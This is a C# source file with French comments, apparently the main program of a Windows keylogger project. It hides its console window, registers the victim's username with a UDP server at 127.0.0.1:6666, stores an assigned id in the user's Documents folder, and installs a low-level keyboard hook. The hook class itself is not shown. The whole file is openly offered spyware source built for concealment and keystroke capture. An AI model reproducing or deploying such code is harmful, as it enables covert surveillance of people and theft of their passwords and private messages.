using System;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;
using System.Net.Sockets;

namespace Keylog
{
    class Program
    {
        // Constante pour le camouflage
        const int SW_HIDE=0;
        const int SW_SHOW=5;

        // variable global pour le keylogger
        private static IntPtr hook = IntPtr.Zero;

        //Methode pour connaitre la taille du paquet qu'on envoi
        static int getLenght_byte(byte[] b)
        {
            int a  = 0;
            foreach(byte elem in b)
            {
                a++;
            }
            return a;
        }

        // Méthode pour récuperer un nom d'utilisateur valide pour créer l'objet
        public static string getName()
        {
            //Si on a déja un fichier existant
            if(File.Exists(@"C:\Users\"+Environment.UserName+@"\Documents\user.txt"))
            {
                //ouverture du fichier
                StreamReader sr = new StreamReader(@"C:\Users\"+Environment.UserName+@"\Documents\user.txt");
                string ligne = "";
                string name = "";
                // on lit le fichier, il n'y a logiquement qu'une seule ligne mais au pire on prend la dernière
			    while ((ligne = sr.ReadLine()) != null)
                {
                    name = ligne;
                }
                sr.Close();
                
                // Cas ou le fichier est vide
                if(name == "")
                {
                    // Demande de création d'utilisateur
                    name = "creation utilisateur svp;"+ Environment.UserName;

                    // Initialisation de la connexion
                    UdpClient client  = new UdpClient();
                    IPEndPoint ep = new IPEndPoint(IPAddress.Parse("127.0.0.1"),6666);
                    client.Connect(ep);
                    
                    // On convertit le message dans le format d'envoi
                    byte[] b = Encoding.ASCII.GetBytes(name);
                    
                    //Envoi au serveur
                    client.Send(b,getLenght_byte(b));

                    // On attend la réponse
                    byte[] name_b = client.Receive(ref ep);

                    name = Encoding.Default.GetString(name_b);

                    // Ecriture de la réponse 
                    StreamWriter sw = new StreamWriter(@"C:\Users\"+Environment.UserName+@"\Documents\user.txt",false);
                    sw.WriteLine(name);
                    sw.Close();
                }

                return name;
            }
            else //Sinon on doit récupérer un nom et créer le fichier et écrire dedans
            {

                // Meme schema que la partie precedente
                string name = "creation utilisateur svp;"+ Environment.UserName;
                UdpClient client  = new UdpClient();
                IPEndPoint ep = new IPEndPoint(IPAddress.Parse("127.0.0.1"),6666);
                client.Connect(ep);
                byte[] b = Encoding.ASCII.GetBytes(name);
                client.Send(b,getLenght_byte(b));
                byte[] name_b = client.Receive(ref ep);

                name = Encoding.Default.GetString(name_b);

                StreamWriter sw = new StreamWriter(@"C:\Users\"+Environment.UserName+@"\Documents\user.txt",false);
                sw.WriteLine(name);
                sw.Close();
                
                return name;

            }
            

        }

        static void Main(string[] args)
        {
            // On cache instantement la console
            ShowWindow(GetConsoleWindow() , SW_HIDE);

            // on récupère un nom pour créer l'objet
            string name = getName();
            
            // Création de l'objet
            Keylog_exe kl = new Keylog_exe(name);
            
            //Mise en place du keylogger
            hook = Keylog_exe.SetHook(Keylog_exe.llkProcedure);
            
            // Lancement du keylogger
            System.Windows.Forms.Application.Run();
            
            
            Keylog_exe.UnhookWindowsHookEx(hook);
        }

        // Importation de librairie pour la partie camouflage du keylogger

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("Kernel32")]
        private static extern IntPtr GetConsoleWindow();
    }
}
